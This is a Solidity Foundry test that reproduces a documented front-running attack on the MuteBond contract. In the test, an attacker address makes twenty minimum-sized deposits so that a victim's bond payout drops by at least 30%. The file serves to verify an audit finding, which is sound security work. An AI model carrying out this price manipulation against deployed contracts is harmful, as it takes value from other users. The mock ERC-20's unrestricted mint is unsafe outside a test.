// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../src/mute/bonds/MuteBond.sol";

/// @dev Minimal ERC-20 used only to fund the real MuteBond implementation.
contract MuteERC20 {
    string public name;
    string public symbol;
    uint8 public immutable decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 permitted = allowance[from][msg.sender];
        if (permitted != type(uint256).max) allowance[from][msg.sender] = permitted - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract MuteTreasury {
    address public immutable payoutToken;
    address public immutable owner;

    constructor(address payout) {
        payoutToken = payout;
        owner = msg.sender;
    }

    function sendPayoutTokens(uint amount) external {
        MuteERC20(payoutToken).transfer(msg.sender, amount);
    }
}

contract MuteDMute {
    mapping(address => uint256) public locked;

    function LockTo(uint256 amount, uint256, address to) external {
        locked[to] += amount;
    }
}

contract MuteBondFrontRunTest is Test {
    MuteERC20 internal lp;
    MuteERC20 internal payout;
    MuteTreasury internal treasury;
    MuteDMute internal dMute;
    MuteBond internal bond;
    address internal attacker = address(0xA11CE);
    address internal victim = address(0xB0B);

    function setUp() public {
        lp = new MuteERC20("LP", "LP");
        payout = new MuteERC20("MUTE", "MUTE");
        treasury = new MuteTreasury(address(payout));
        dMute = new MuteDMute();
        // These values match the MuteBond deployment parameters used by the
        // Code4rena test: 100e18 -> 200e18 over one seven-day epoch.
        bond = new MuteBond(address(treasury), address(lp), address(dMute), 200e18, 100e18, 1_000_000e18);

        payout.mint(address(treasury), 1_000_000e18);
        lp.mint(attacker, 1_000e18);
        lp.mint(victim, 1_000e18);
        vm.prank(attacker);
        lp.approve(address(bond), type(uint256).max);
        vm.prank(victim);
        lp.approve(address(bond), type(uint256).max);
    }

    function testRealMuteBondFrontRunLowersVictimPayout() public {
        vm.warp(block.timestamp + 7 days);
        uint256 expectedPrice = bond.bondPrice();
        uint256 expectedPayout = bond.payoutFor(10 ether);

        // This is the exact attack from test/bonds.ts: twenty minimum-sized
        // purchases advance epochStart before the victim's transaction lands.
        uint256 minimumValue = (0.01 ether * 1e18) / bond.startPrice() + 1;
        for (uint256 i; i < 20; ++i) {
            vm.prank(attacker);
            bond.deposit(minimumValue, attacker, false);
        }

        uint256 actualPrice = bond.bondPrice();
        assertLt(actualPrice, expectedPrice);
        assertLe(actualPrice * 100, expectedPrice * 70, "the documented 30% payout reduction did not occur");

        // `deposit` advances epochStart as part of the same transaction, so
        // quote the payout immediately before calling the state-changing
        // function instead of querying after the timestamp/state transition.
        uint256 payoutAtExecution = bond.payoutFor(10 ether);
        vm.prank(victim);
        uint256 payoutReceived = bond.deposit(10 ether, victim, false);
        assertEq(payoutReceived, payoutAtExecution);
        assertLt(payoutReceived, expectedPayout);
        assertEq(dMute.locked(victim), payoutReceived);
    }
}
